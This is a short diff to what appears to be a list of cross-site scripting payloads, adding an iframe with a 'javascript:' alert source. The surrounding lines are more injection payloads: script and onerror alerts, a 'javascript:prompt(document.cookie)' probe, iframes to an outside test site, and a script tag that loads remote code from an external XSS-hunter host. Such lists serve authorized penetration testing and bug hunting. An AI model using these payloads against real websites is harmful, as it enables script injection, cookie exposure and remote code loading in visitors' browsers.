@@ -44,6 +44,7 @@ javascript:prompt(document.cookie)
 --><script>alert(1)</script>
 --><img src=x onerror=alert(Gotcha)>
 <iframe src='https://testforiframe.site/'>
+<iframe src="javascript:alert(`xss`)">.
 "><iframe src='https://testforiframe.site/'>
 "><script src="https://ee.xss.ht/"></script>
 "><script>alert(document.domain)</script>
